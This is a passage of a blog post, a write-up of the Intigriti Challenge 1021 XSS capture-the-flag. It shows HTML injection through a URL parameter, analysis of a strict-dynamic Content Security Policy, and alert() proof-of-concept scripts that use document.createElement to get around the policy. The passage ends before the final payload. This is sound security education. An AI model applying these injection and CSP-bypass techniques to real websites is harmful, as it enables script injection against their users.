<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Intigriti - Challenge 1021 Writeup" /><meta name="author" content="H0j3n" /><meta property="og:locale" content="en" /><meta name="description" content="This is my first attempt at the intigriti challenge. I’m writing this to learn and share my experience with others. I’ve included information from various sources to provide a comprehensive overview." /><meta property="og:description" content="This is my first attempt at the intigriti challenge. I’m writing this to learn and share my experience with others. I’ve included information from various sources to provide a comprehensive overview." /><link rel="canonical" href="https://h0j3n.github.io/posts/Intigriti-Challenge-1021-Writeup/" /><meta property="og:url" content="https://h0j3n.github.io/posts/Intigriti-Challenge-1021-Writeup/" /><meta property="og:site_name" content="$(H0j3n)" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2023-06-02T08:00:00+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Intigriti - Challenge 1021 Writeup" /><meta name="twitter:site" content="@H0j3n" /><meta name="twitter:creator" content="@H0j3n" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"H0j3n"},"dateModified":"2023-06-11T00:54:18+08:00","datePublished":"2023-06-02T08:00:00+08:00","description":"This is my first attempt at the intigriti challenge. I’m writing this to learn and share my experience with others. I’ve included information from various sources to provide a comprehensive overview.","headline":"Intigriti - Challenge 1021 Writeup","mainEntityOfPage":{"@type":"WebPage","@id":"https://h0j3n.github.io/posts/Intigriti-Challenge-1021-Writeup/"},"url":"https://h0j3n.github.io/posts/Intigriti-Challenge-1021-Writeup/"}</script><title>Intigriti - Challenge 1021 Writeup | $(H0j3n)</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="$(H0j3n)"><meta name="application-name" content="$(H0j3n)"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="https://avatars.githubusercontent.com/u/51261763?v=4" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">$(H0j3n)</a></div><div class="site-subtitle font-italic">Knowledge sharing related to Cybersecurity</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/H0j3n" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/H0j3n" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['',''].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Intigriti - Challenge 1021 Writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>Intigriti - Challenge 1021 Writeup</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1685664000" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Jun 2, 2023 </em> </span> <span> Updated <em class="" data-ts="1686416058" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Jun 11, 2023 </em> </span><div class="d-flex justify-content-between"> <span> By <em> H0j3n </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1286 words"> <em>7 min</em> read</span></div></div></div><div class="post-content"><p>This is my first attempt at the intigriti challenge. I’m writing this to learn and share my experience with others. I’ve included information from various sources to provide a comprehensive overview.</p><h2 id="intigriti---challenge-1021"><span class="mr-2">Intigriti - Challenge 1021</span><a href="#intigriti---challenge-1021" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p><img data-src="https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/9_intigriti/intigriti_1021_1.png" alt="" data-proofer-ignore></p><p>Link to challenge: <a href="https://challenge-1021.intigriti.io/">https://challenge-1021.intigriti.io/</a></p><p>By viewing the page source, we can observe that the <strong>iframe</strong> leads to <code class="language-plaintext highlighter-rouge">challenge.php</code>.</p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"card-container"</span><span class="nt">&gt;</span>
      <span class="nt">&lt;iframe</span> <span class="na">src=</span><span class="s">"challenge/challenge.php"</span> <span class="na">width=</span><span class="s">"100%"</span> <span class="na">height=</span><span class="s">"700px"</span><span class="nt">&gt;&lt;/iframe&gt;</span>
<span class="nt">&lt;/div&gt;</span>
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/9_intigriti/intigriti_1021_2.png" alt="" data-proofer-ignore></p><p>Link to <strong>challenge.php</strong>: <a href="https://challenge-1021.intigriti.io/challenge/challenge.php">https://challenge-1021.intigriti.io/challenge/challenge.php</a></p><p>The challenge page states that the <code class="language-plaintext highlighter-rouge">html</code> parameter can be utilized to convey messages.</p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>ARE YOU SCARED?
ARE YOU STILL SANE?
NOBODY CAN BREAK THIS!
NOBODY CAN SAVE INTIGRITI
I USE ?html= TO CONVEY THESE MESSAGES
I'LL RELEASE INTIGRITI FROM MY WRATH...
... AFTER YOU POP AN XSS
ELSE, INTIGRITI IS MINE
</pre></table></code></div></div><p>To verify this, we can send a simple value such as <strong>“POC”</strong> in the <code class="language-plaintext highlighter-rouge">html</code> parameter. Upon inspection, we can observe that the string <strong>“POC”</strong> is indeed reflected on the web page.</p><ul><li><a href="https://challenge-1021.intigriti.io/challenge/challenge.php?html=POC">https://challenge-1021.intigriti.io/challenge/challenge.php?html=POC</a></ul><p><img data-src="https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/9_intigriti/intigriti_1021_3.png" alt="" data-proofer-ignore></p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"html"</span> <span class="na">class=</span><span class="s">"text"</span><span class="nt">&gt;&lt;h1</span> <span class="na">class=</span><span class="s">"light"</span><span class="nt">&gt;</span>POC<span class="nt">&lt;/div&gt;</span>
</pre></table></code></div></div><p>Let’s attempt <strong>HTML injection</strong> by testing with a basic HTML snippet to see if we can successfully inject HTML code into the page. Here’s an example of a test code:</p><ul><li><a href="https://challenge-1021.intigriti.io/challenge/challenge.php?html=%3Ch1%3E%3Cs%3EPOC%3C/s%3E%3C/h1%3E">https://challenge-1021.intigriti.io/challenge/challenge.php?html=%3Ch1%3E%3Cs%3EPOC%3C/s%3E%3C/h1%3E</a></ul><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nt">&lt;h1&gt;&lt;s&gt;</span>POC<span class="nt">&lt;/s&gt;&lt;/h1&gt;</span>
</pre></table></code></div></div><p>By sending this code as the value for the <strong>html</strong> parameter, we can verify the HTML injection occurs.</p><p><img data-src="https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/9_intigriti/intigriti_1021_4.png" alt="" data-proofer-ignore></p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"html"</span> <span class="na">class=</span><span class="s">"text"</span><span class="nt">&gt;&lt;h1</span> <span class="na">class=</span><span class="s">"light"</span><span class="nt">&gt;&lt;h1&gt;&lt;s&gt;</span>POC<span class="nt">&lt;/s&gt;&lt;/h1&gt;&lt;/div&gt;</span>
</pre></table></code></div></div><p>However, it seems that even though the <code class="language-plaintext highlighter-rouge">&lt;script&gt;</code> tag is not filtered, a simple XSS code like below does not execute as expected.</p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"html"</span> <span class="na">class=</span><span class="s">"text"</span><span class="nt">&gt;&lt;h1</span> <span class="na">class=</span><span class="s">"light"</span><span class="nt">&gt;&lt;script&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="nt">&lt;/script&gt;&lt;/div&gt;</span>
</pre></table></code></div></div><p>Upon inspecting the element, we can observe that there are a few errors present.</p><ul><li><code class="language-plaintext highlighter-rouge">Content Security Policy</code><li><code class="language-plaintext highlighter-rouge">Uncaught TypeError: document.getElementById(...) is null</code><li><code class="language-plaintext highlighter-rouge">Uncaught SyntaxError: expected expression, got ')'</code></ul><p><img data-src="https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/9_intigriti/intigriti_1021_5.png" alt="" data-proofer-ignore></p><p>Let’s take a look at each of these errors and identify why it give us an error.</p><h3 id="content-security-policy-csp"><span class="mr-2">Content Security Policy (CSP)</span><a href="#content-security-policy-csp" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>In the response headers, there is no indicator of CSP implemented. But we can see in the page source how the web page implemented the CSP.</p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="nt">&lt;meta</span>
  <span class="na">http-equiv=</span><span class="s">"Content-Security-Policy"</span>
  <span class="na">content=</span><span class="s">"default-src 'none'; 
	  script-src 'unsafe-eval' 'strict-dynamic' 'nonce-a5653f86ab0d00e7ea5297f7264c43c0';
	  style-src 'nonce-51070e634c401773866289cb83ad269e'"</span>
<span class="nt">/&gt;</span>
</pre></table></code></div></div><p>While exploring this CSP further, I came across some interesting information about the usage of <code class="language-plaintext highlighter-rouge">strict-dynamic</code> in <strong>Content Security Policy (CSP)</strong>. You can find this information in <a href="https://exploited.cz/xss/csp/strict.php?inserted=parser">here</a></p><blockquote class="prompt-info"><div><p><code class="language-plaintext highlighter-rouge">strict-dynamic</code>: Allows script which executes on a page to load more scripts via non-“HTML-parser-inserted” script elements using document.createElement(‘script’); or similar (CSP3 and above)</p></div></blockquote><p>To have a quick check for <code class="language-plaintext highlighter-rouge">strict-dynamic</code>, we can try compare with and without using <code class="language-plaintext highlighter-rouge">document.createElement</code> to get an XSS.</p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre><span class="nt">&lt;html</span> <span class="na">lang=</span><span class="s">"en"</span><span class="nt">&gt;</span>
  <span class="nt">&lt;head&gt;</span>
    <span class="nt">&lt;meta</span>
      <span class="na">http-equiv=</span><span class="s">"Content-Security-Policy"</span>
      <span class="na">content=</span><span class="s">"default-src 'none'; script-src 'unsafe-eval' 'strict-dynamic' 'nonce-a5653f86ab0d00e7ea5297f7264c43c0'; style-src 'nonce-51070e634c401773866289cb83ad269e'"</span>
    <span class="nt">/&gt;</span>
  <span class="nt">&lt;/head&gt;</span>
  <span class="nt">&lt;body</span> <span class="na">id=</span><span class="s">"body"</span><span class="nt">&gt;</span>
    <span class="c">&lt;!-- POC (XSS) #1 --&gt;</span>
    <span class="nt">&lt;script </span><span class="na">nonce=</span><span class="s">"a5653f86ab0d00e7ea5297f7264c43c0"</span><span class="nt">&gt;</span>
        <span class="kd">let</span> <span class="nx">s</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="dl">"</span><span class="s2">script</span><span class="dl">"</span><span class="p">);</span>
        <span class="nx">s</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">createTextNode</span><span class="p">(</span><span class="dl">"</span><span class="s2">alert('Using createElement script')</span><span class="dl">"</span><span class="p">));</span>
        <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">s</span><span class="p">);</span>
    <span class="nt">&lt;/script&gt;</span>
    <span class="c">&lt;!-- POC (XSS) #2 --&gt;</span>
    <span class="nt">&lt;script </span><span class="na">nonce-</span><span class="err">"</span><span class="na">a5653f86ab0d00e7ea5297f7264c43c0</span><span class="err">"</span><span class="nt">&gt;</span>
        <span class="nx">alert</span><span class="p">(</span><span class="dl">'</span><span class="s1">Without createElement script</span><span class="dl">'</span><span class="p">);</span>
    <span class="nt">&lt;/script&gt;</span>
  <span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</pre></table></code></div></div><p>As we can observe, only the XSS in the first Proof of Concept (POC) will be executed successfully, whereas the second one will be prevented from executing due to the Content Security Policy (CSP). We will come back to this topic in the solution part later.</p><p><img data-src="https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/9_intigriti/intigriti_1021_6.png" alt="" data-proofer-ignore></p><h3 id="uncaught-typeerror"><span class="mr-2">Uncaught TypeError</span><a href="#uncaught-typeerror" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>The error occurs because the web is attempting to retrieve the element with the id <strong>“lock,”</strong> but it cannot be found, resulting in the value becoming null.</p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="nt">&lt;script </span><span class="na">nonce=</span><span class="s">"afedac0a9a5507ad03f76ca4f5d76a81"</span><span class="nt">&gt;</span>
<span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">lock</span><span class="dl">'</span><span class="p">).</span><span class="nx">onclick</span> <span class="o">=</span> <span class="p">()</span> <span class="o">=&gt;</span>
	<span class="p">{</span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">lock</span><span class="dl">'</span><span class="p">).</span><span class="nx">classList</span><span class="p">.</span><span class="nx">toggle</span><span class="p">(</span><span class="dl">'</span><span class="s1">unlocked</span><span class="dl">'</span><span class="p">);</span>
<span class="p">}</span><span class="nt">&lt;/script&gt;</span>
</pre></table></code></div></div><p>Despite encountering this error, we can still proceed with solving the challenge. The absence of the <strong>“lock”</strong> element and the resulting null value does not stop us to find a solution.</p><h3 id="uncaught-syntaxerror"><span class="mr-2">Uncaught SyntaxError</span><a href="#uncaught-syntaxerror" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>This error occurs within the snippet of JavaScript code provided below:</p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre><span class="nt">&lt;script </span><span class="na">nonce=</span><span class="s">"afedac0a9a5507ad03f76ca4f5d76a81"</span><span class="nt">&gt;</span>
      <span class="nb">window</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="dl">"</span><span class="s2">DOMContentLoaded</span><span class="dl">"</span><span class="p">,</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
        <span class="nx">e</span> <span class="o">=</span> <span class="s2">`)]}'`</span> <span class="o">+</span> <span class="k">new</span> <span class="nx">URL</span><span class="p">(</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="p">).</span><span class="nx">searchParams</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="dl">"</span><span class="s2">xss</span><span class="dl">"</span><span class="p">);</span>
        <span class="nx">c</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">body</span><span class="dl">"</span><span class="p">).</span><span class="nx">lastElementChild</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="nx">c</span><span class="p">.</span><span class="nx">id</span> <span class="o">===</span> <span class="dl">"</span><span class="s2">intigriti</span><span class="dl">"</span><span class="p">)</span> <span class="p">{</span>
          <span class="nx">l</span> <span class="o">=</span> <span class="nx">c</span><span class="p">.</span><span class="nx">lastElementChild</span><span class="p">;</span>
          <span class="nx">i</span> <span class="o">=</span> <span class="nx">l</span><span class="p">.</span><span class="nx">innerHTML</span><span class="p">.</span><span class="nx">trim</span><span class="p">();</span>
          <span class="nx">f</span> <span class="o">=</span> <span class="nx">i</span><span class="p">.</span><span class="nx">substr</span><span class="p">(</span><span class="nx">i</span><span class="p">.</span><span class="nx">length</span> <span class="o">-</span> <span class="mi">4</span><span class="p">);</span>
          <span class="nx">e</span> <span class="o">=</span> <span class="nx">f</span> <span class="o">+</span> <span class="nx">e</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="kd">let</span> <span class="nx">s</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="dl">"</span><span class="s2">script</span><span class="dl">"</span><span class="p">);</span>
        <span class="nx">s</span><span class="p">.</span><span class="nx">type</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">text/javascript</span><span class="dl">"</span><span class="p">;</span>
        <span class="nx">s</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">createTextNode</span><span class="p">(</span><span class="nx">e</span><span class="p">));</span>
        <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">s</span><span class="p">);</span>
      <span class="p">});</span>
<span class="nt">&lt;/script&gt;</span>
</pre></table></code></div></div><p>Since the parameter <code class="language-plaintext highlighter-rouge">xss</code> was not provided, the value of <code class="language-plaintext highlighter-rouge">e</code> will be <code class="language-plaintext highlighter-rouge">null</code>. The result variable will hold the value <code class="language-plaintext highlighter-rouge">)]}'</code>. Consequently, when attempting to find an element with the id <strong>“intigriti”</strong> it won’t be found in the page source. Therefore, we can assume that the generated script element will resemble the following:</p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="nt">&lt;script </span><span class="na">type=</span><span class="s">"text/javascript"</span><span class="nt">&gt;</span>
	<span class="o">&lt;</span><span class="nx">script</span> <span class="nx">type</span><span class="o">=</span><span class="dl">"</span><span class="s2">text/javascript</span><span class="dl">"</span><span class="o">&gt;</span><span class="p">)]}</span><span class="dl">'</span><span class="s1">null</span><span class="nt">&lt;/script&gt;</span>
<span class="nt">&lt;/script&gt;</span>
</pre></table></code></div></div><p>So now we know the parameter <code class="language-plaintext highlighter-rouge">xss</code> will be a useful for us to get an XSS.</p><h3 id="walkthrough-solution"><span class="mr-2">Walkthrough Solution</span><a href="#walkthrough-solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>We now have two parameters that we can use <code class="language-plaintext highlighter-rouge">html</code> and <code class="language-plaintext highlighter-rouge">xss</code>. Just now we only manage to to append characters/payload after the value <code class="language-plaintext highlighter-rouge">)]}'</code> in variable <code class="language-plaintext highlighter-rouge">e</code>. But, in the snippet code below we found out that variable <code class="language-plaintext highlighter-rouge">f</code> will be append before the variable <code class="language-plaintext highlighter-rouge">e</code>.</p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="nt">&lt;script </span><span class="na">nonce=</span><span class="s">"afedac0a9a5507ad03f76ca4f5d76a81"</span><span class="nt">&gt;</span>
<span class="o">----</span><span class="p">[</span><span class="nx">snip</span><span class="p">]</span><span class="o">----</span>
<span class="nx">c</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">body</span><span class="dl">"</span><span class="p">).</span><span class="nx">lastElementChild</span><span class="p">;</span>
<span class="k">if</span> <span class="p">(</span><span class="nx">c</span><span class="p">.</span><span class="nx">id</span> <span class="o">===</span> <span class="dl">"</span><span class="s2">intigriti</span><span class="dl">"</span><span class="p">)</span> <span class="p">{</span>
  <span class="nx">l</span> <span class="o">=</span> <span class="nx">c</span><span class="p">.</span><span class="nx">lastElementChild</span><span class="p">;</span>
  <span class="nx">i</span> <span class="o">=</span> <span class="nx">l</span><span class="p">.</span><span class="nx">innerHTML</span><span class="p">.</span><span class="nx">trim</span><span class="p">();</span>
  <span class="nx">f</span> <span class="o">=</span> <span class="nx">i</span><span class="p">.</span><span class="nx">substr</span><span class="p">(</span><span class="nx">i</span><span class="p">.</span><span class="nx">length</span> <span class="o">-</span> <span class="mi">4</span><span class="p">);</span>
  <span class="nx">e</span> <span class="o">=</span> <span class="nx">f</span> <span class="o">+</span> <span class="nx">e</span><span class="p">;</span>
<span class="p">}</span>
<span class="o">----</span><span class="p">[</span><span class="nx">snip</span><span class="p">]</span><span class="o">----</span>
<span class="nt">&lt;/script&gt;</span>
</pre></table></code></div></div><p>Let’s try insert a simple payload with id <code class="language-plaintext highlighter-rouge">intigriti</code></p><div class="language-cs highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
